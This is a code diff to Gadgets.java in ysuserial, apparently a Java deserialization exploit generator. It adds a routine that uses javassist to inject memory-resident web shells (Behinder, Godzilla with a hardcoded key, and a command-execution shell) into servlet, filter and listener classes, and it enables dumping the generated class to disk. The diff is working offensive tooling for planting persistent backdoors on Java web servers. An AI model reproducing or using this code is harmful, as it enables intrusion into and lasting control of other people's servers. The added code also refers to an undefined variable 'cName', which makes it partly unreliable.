@@ -2,16 +2,16 @@ package org.su18.ysuserial.payloads.util;
 
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
+import static org.su18.ysuserial.payloads.templates.MemShellPayloads.*;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
+import java.io.FileOutputStream;
 import java.io.Serializable;
-import java.lang.reflect.Array;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.InvocationHandler;
-import java.lang.reflect.Proxy;
+import java.lang.reflect.*;
 import java.util.HashMap;
 import java.util.Map;
+import java.util.Objects;
 import java.util.zip.GZIPOutputStream;
 
 import javassist.*;
@@ -124,6 +124,7 @@ public class Gadgets {
 		// 如果命令以 EX- 开头（Extra 特殊功能），根据想使用的不同类获取不同的 class 模板进行加载获取不同的功能
 		if (command.startsWith("EX-")) {
 			command = command.substring(3);
+			String type = "";
 
 			// 如果命令以 MS 开头，则代表是注入内存马
 			if (command.startsWith("MS-")) {
@@ -155,13 +156,17 @@ public class Gadgets {
 						break;
 				}
 
-				clazz = Class.forName(packageName + command, false, Gadgets.class.getClassLoader());
+				String[] commands = command.split("[-]");
+				String   name     = commands[0];
+				type = command.split("[-]")[1];
+
+				clazz = Class.forName(packageName + name, false, Gadgets.class.getClassLoader());
 			} else {
 				// 这里不能让它初始化，不然从线程中获取 WebappClassLoaderBase 时会强制类型转换异常。
 				clazz = Class.forName(packageName + command, false, Gadgets.class.getClassLoader());
 			}
 
-			return createTemplatesImpl(clazz, null, null, null, tplClass, abstTranslet, transFactory);
+			return createTemplatesImpl(clazz, null, null, type, tplClass, abstTranslet, transFactory);
 			// 如果命令以 LF- 开头 （Local File），则程序可以生成一个能加载本地指定类字节码并初始化的逻辑，后面跟文件路径-类名
 		} else if (command.startsWith("LF-")) {
 			command = command.substring(3);
@@ -183,7 +188,7 @@ public class Gadgets {
 		pool.insertClassPath(new ClassClassPath(abstTranslet));
 		CtClass superClass = pool.get(abstTranslet.getName());
 
-		CtClass ctClass;
+		CtClass ctClass = null;
 
 		// 如果 Command 不为空，则是普通的命令执行，使用 CommandTemplate 进行执行
 		if (command != null) {
@@ -204,11 +209,12 @@ public class Gadgets {
 
 		// 如果 myClass 不为空，则说明指定了一些 Class 执行特殊功能
 		if (myClass != null) {
-			ctClass = pool.get(myClass.getName());
+			String className = myClass.getName();
+			ctClass = pool.get(className);
 			ctClass.setSuperclass(superClass);
 
 			// 如果是打入 Spring 拦截器类型的内存马，则修改 SpringInterceptorTemplate 创建类字节码，并写入 SpringInterceptorMS 中
-			if (myClass.getName().contains("SpringInterceptorMS")) {
+			if (className.contains("SpringInterceptorMS")) {
 
 				String  target              = "org.su18.ysuserial.payloads.templates.memshell.spring.SpringInterceptorTemplate";
 				CtClass springTemplateClass = pool.get(target);
@@ -226,10 +232,16 @@ public class Gadgets {
 				classBytes = ctClass.toBytecode();
 			} else {
 				// 其他的通过类名自定义加载，NeoReg 不改类名
-				if (!"org.su18.ysuserial.payloads.templates.TLNeoRegFromThread".equals(myClass.getName())) {
+				if (!"org.su18.ysuserial.payloads.templates.TLNeoRegFromThread".equals(className)) {
 					// 测试方便调试暂时不改类名
-					ctClass.setName(myClass.getName() + System.nanoTime());
+					ctClass.setName(className + System.nanoTime());
 				}
+
+				// 内存马指定类型进行写入恶意逻辑
+				if (!Objects.equals(cName, "")) {
+					insertKeyMethod(ctClass, cName);
+				}
+
 				classBytes = ctClass.toBytecode();
 			}
 		}
@@ -249,11 +261,20 @@ public class Gadgets {
 			classBytes = ctClass.toBytecode();
 		}
 
+
 		// 写出 class 试试
-//        FileOutputStream fileOutputStream = new FileOutputStream("a.class");
-//        fileOutputStream.write(classBytes);
-//        fileOutputStream.flush();
-//        fileOutputStream.close();
+		FileOutputStream fileOutputStream = new FileOutputStream("a.class");
+		fileOutputStream.write(classBytes);
+		fileOutputStream.flush();
+		fileOutputStream.close();
+
+		// 加载 class 试试
+//		ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+//		Method      method      = Proxy.class.getDeclaredMethod("defineClass0", ClassLoader.class, String.class, byte[].class, int.class, int.class);
+//		method.setAccessible(true);
+//		Class clazz = (Class) method.invoke(null, classLoader, ctClass.getName(), classBytes, 0, classBytes.length);
+//		clazz.newInstance();
+
 
 		// inject class bytes into instance
 		Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, ClassFiles.classAsBytes(CheckCPUTime.class)});
@@ -282,5 +303,87 @@ public class Gadgets {
 		Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
 		Reflections.setFieldValue(s, "table", tbl);
 		return s;
+	}
+
+	public static void insertKeyMethod(CtClass ctClass, String type) throws Exception {
+
+		// 判断是否为 Tomcat 类型，需要对 request 封装使用额外的 payload
+		String name = ctClass.getName();
+		name = name.substring(name.lastIndexOf(".") + 1);
+		boolean isTomcat = name.startsWith("T");
+
+		// 判断是 filter 型还是 servlet 型内存马，根据不同类型写入不同逻辑
+		String method = "";
+
+		CtClass[] classes = ctClass.getInterfaces();
+		for (CtClass aClass : classes) {
+			String iName = aClass.getName();
+			if (iName.equals("javax.servlet.Servlet")) {
+				method = "service";
+				break;
+			} else if (iName.equals("javax.servlet.Filter")) {
+				method = "doFilter";
+				break;
+			} else if (iName.equals("javax.servlet.ServletRequestListener")) {
+				method = "requestInitializedHandle";
+				isTomcat = false;
+				break;
+			}
+		}
+
+		switch (type) {
+			// 冰蝎类型的内存马
+			case "bx":
+				ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
+				ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
+
+				if (isTomcat) {
+					insertMethod(ctClass, method, Utils.base64Decode(BEHINDER_SHELL_FOR_TOMCAT));
+				} else {
+					insertMethod(ctClass, method, Utils.base64Decode(BEHINDER_SHELL));
+				}
+				break;
+			// 哥斯拉类型的内存马
+			case "gz":
+				ctClass.addField(CtField.make("Class payload ;", ctClass));
+				ctClass.addField(CtField.make("String xc = \"7ff9fe91aaa7d3aa\";", ctClass));
+
+				ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
+				ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
+				ctClass.addMethod(CtMethod.make(Utils.base64Decode(MD5), ctClass));
+				ctClass.addMethod(CtMethod.make(Utils.base64Decode(AES_FOR_GODZILLA), ctClass));
+
+				insertMethod(ctClass, method, Utils.base64Decode(GODZILLA_SHELL));
+				break;
+			// 哥斯拉 raw 类型的内存马
+			case "gzraw":
+				ctClass.addField(CtField.make("Class payload ;", ctClass));
+				ctClass.addField(CtField.make("String xc = \"7ff9fe91aaa7d3aa\";", ctClass));
+
+				ctClass.addMethod(CtMethod.make(Utils.base64Decode(AES_FOR_GODZILLA), ctClass));
+
+				insertMethod(ctClass, method, Utils.base64Decode(GODZILLA_RAW_SHELL));
+				break;
+			// 命令执行回显内存马
+			case "cmd":
+			default:
+				ctClass.addMethod(CtMethod.make(Utils.base64Decode(TO_CSTRING_Method), ctClass));
+				ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_BY_CLASS), ctClass));
+				ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_AND_INVOKE), ctClass));
+				ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
+
+				if (isTomcat) {
+					insertMethod(ctClass, method, Utils.base64Decode(CMD_SHELL_FOR_TOMCAT));
+				} else {
+					insertMethod(ctClass, method, Utils.base64Decode(CMD_SHELL));
+				}
+				break;
+		}
+	}
+
+	public static void insertMethod(CtClass ctClass, String method, String payload) throws NotFoundException, CannotCompileException {
+		// 根据传入的不同参数，在不同方法中插入不同的逻辑
+		CtMethod cm = ctClass.getDeclaredMethod(method);
+		cm.setBody(payload);
 	}
 }
